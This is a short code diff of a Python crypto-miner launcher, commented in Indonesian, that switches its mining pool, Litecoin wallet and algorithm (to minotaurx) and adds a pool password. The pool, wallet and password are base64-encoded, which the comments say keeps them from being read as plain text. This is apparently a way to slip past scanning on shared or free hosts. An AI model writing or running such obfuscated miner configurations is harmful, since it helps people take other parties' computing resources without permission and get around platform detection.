@@ -6,13 +6,13 @@ import base64
 
 # --- BAGIAN KONFIGURASI TERENKRIPSI BASE64 ---
 # Mengodekan alamat pool dan wallet agar tidak terbaca sebagai plain text
-pool_b64 = "c3RyYXR1bSt0Y3A6Ly9zdHJhdHVtLWV1LnJwbGFudC54eXo6NzA1OQ=="
-wallet_b64 = "VFZxMms5TjhIUTdSSDRoMUo2TFJzeWtmWWhxTW40aFFlUg=="
-
+pool_b64 = "c3RyYXR1bSt0Y3A6Ly9taW5vdGF1cnguZXUubWluZS56cG9vbC5jYTo3MDE5"
+wallet_b64 = "bHRjMXFuYWM3eGhxdXd0ZGtnNTJwODdsN2Y2ajdwcjlsc2xmZWgwcjJ2eQ=="
+password_b64 = "Yz1MVEMsemFwPU1BWkE="
 # Proses decode otomatis saat skrip Python dijalankan
 POOL_URL = base64.b64decode(pool_b64).decode('utf-8')
 WALLET_ADDRESS = base64.b64decode(wallet_b64).decode('utf-8')
-
+MINER_PASSWORD = base64.b64decode(password_b64).decode('utf-8')
 WORKER_NAME = "UbuntuPythonWorker"
 CPU_THREADS = "4"
 
@@ -29,9 +29,10 @@ if not os.path.exists(binary_path):
 # Menyusun argumen perintah miner
 arguments = [
     binary_path,
-    "-a", "yespowerTIDE",
+    "-a", "minotaurx",
     "-o", POOL_URL,
     "-u", f"{WALLET_ADDRESS}.{WORKER_NAME}",
+    "-p", MINER_PASSWORD,
     "-t", CPU_THREADS
 ]
 
